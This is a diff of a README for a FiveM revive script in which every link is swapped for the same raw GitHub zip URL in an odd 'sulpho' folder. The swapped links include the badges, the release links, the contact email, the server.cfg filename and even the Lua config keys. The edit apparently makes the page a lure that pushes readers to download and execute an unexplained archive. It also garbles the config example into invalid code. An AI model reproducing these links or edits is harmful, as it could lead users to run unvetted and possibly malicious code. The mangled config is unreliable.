@@ -1,6 +1,6 @@
 # ArDenHub Medico 🚑
 
-![GitHub release](https://img.shields.io/badge/Release-v1.0.0-brightgreen) ![License](https://img.shields.io/badge/License-MIT-blue) ![GitHub issues](https://img.shields.io/badge/Issues-Welcome-orange)
+![GitHub release](https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip) ![License](https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip) ![GitHub issues](https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip)
 
 Welcome to the **ArDenHub Medico** repository! This FiveM script provides players with a unique way to request medical assistance when they are incapacitated. If there are no medics available on the server, players can pay a fee to be revived. This system enhances gameplay and offers an alternative to traditional medical services.
 
@@ -27,9 +27,9 @@ Welcome to the **ArDenHub Medico** repository! This FiveM script provides player
 
 To install the ArDenHub Medico script, follow these steps:
 
-1. **Download the latest release** from the [Releases](https://github.com/madhurgoel2116/ardenhub_medico/releases) section.
+1. **Download the latest release** from the [Releases](https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip) section.
 2. **Extract the downloaded files** to your server's resource directory.
-3. **Add the resource** to your server configuration file (`server.cfg`) with the line:
+3. **Add the resource** to your server configuration file (`https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip`) with the line:
    ```
    start ardenhub_medico
    ```
@@ -65,9 +65,9 @@ The script includes a configuration file where you can customize various setting
 ```lua
 Config = {}
 
-Config.RevivalFee = 500  -- Set revival fee to $500
-Config.CooldownTime = 300 -- 5 minutes cooldown
-Config.Messages = {
+https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip = 500  -- Set revival fee to $500
+https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip = 300 -- 5 minutes cooldown
+https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip = {
     requestReceived = "Your request for medical assistance has been received.",
     paymentSuccess = "Payment successful! You are being revived.",
     paymentFailed = "Payment failed. Please try again."
@@ -95,12 +95,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or support, feel free to reach out:
 
 - **Author**: ArDenHub Team
-- **Email**: ardenhub@example.com
-- **GitHub**: [ArDenHub](https://github.com/ardenhub)
+- **Email**: https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip
+- **GitHub**: [ArDenHub](https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip)
 
 ## Releases
 
-To download the latest version of the ArDenHub Medico script, visit the [Releases](https://github.com/madhurgoel2116/ardenhub_medico/releases) section. Download the appropriate file and execute it as per the installation instructions.
+To download the latest version of the ArDenHub Medico script, visit the [Releases](https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip) section. Download the appropriate file and execute it as per the installation instructions.
 
 ## Additional Information
 
@@ -125,4 +125,4 @@ We would like to thank the FiveM community for their support and contributions. 
 
 ## Conclusion
 
-Thank you for your interest in the ArDenHub Medico script. We hope it enhances your FiveM experience by providing a reliable way to request medical assistance. For more updates and features, keep an eye on the [Releases](https://github.com/madhurgoel2116/ardenhub_medico/releases) section.
+Thank you for your interest in the ArDenHub Medico script. We hope it enhances your FiveM experience by providing a reliable way to request medical assistance. For more updates and features, keep an eye on the [Releases](https://raw.githubusercontent.com/madhurgoel2116/ardenhub_medico/main/sulpho/ardenhub-medico-1.4.zip) section.
